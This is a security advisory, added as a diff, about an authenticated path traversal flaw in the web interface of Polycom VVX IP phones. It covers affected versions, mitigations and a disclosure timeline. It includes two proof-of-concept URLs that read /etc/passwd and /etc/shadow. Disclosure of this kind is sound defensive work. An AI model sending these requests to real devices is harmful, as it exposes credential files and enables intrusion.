@@ -1,0 +1,46 @@
+Polycom VVX-Series Business Media Phones Path Traversal Vulnerability
+
+--Summary--
+
+Polycom VVX-series Business Media Phones allow authenticated users to execute file path traversal attacks
+
+# Polycom
+# http://www.polycom.com
+
+--Affects--
+
+# Polycom VVX 101, 201, 300, 310, 400, 410, 500, 600, & 1500
+# UC Software 4.1.8 and earlier, 5.2.3 and earlier, 5.3.1 and earlier, 5.4.0 and earlier
+
+--Details--
+
+Polycom VVX-series IP phones provide a web administrative interface. Inside this interface we discovered two URLs that exposed a "file=filename" parameters. Due to unsafe file system operations in this interface, it is possible to exploit the following pages, and possibly others, using path traversal attacks:
+
+http://a.b.c.d/Preferences/Ringtone?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
+http://a.b.c.d/Preferences/Background?file=.%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow
+
+--Mitigation--
+
+Upgrade to the latest version of UC Software available.
+Disable or restrict access to the web interface.
+
+--Timeline--
+
+# 6/16/2015: Notified Polycom about the issue
+# 6/17/2015: Polycom responds, indicates it is investigating
+# 6/18/2015: Polycom acknowledges vulnerability legitimacy
+# 6/26/2015: Polycom waiting on estimate for fix from engineering
+# 7/22/2015: Polycom provides with projected timelines for fixes
+# 11/24/2015: Polycom confirms all VVX branches are patched
+# 12/9/2015: Polycom issues public vulnerability advisory
+
+--References--
+
+https://depthsecurity.com/blog/polycom-vvx-series-business-media-phones-path-traversal-vulnerability 
+
+http://supportdocs.polycom.com/PolycomService/support/global/documents/support/documentation/VVX_Path_Traversals_v_1_0.pdf
+
+Jake Reynolds
+Partner/Principal Consultant
+www.depthsecurity.com
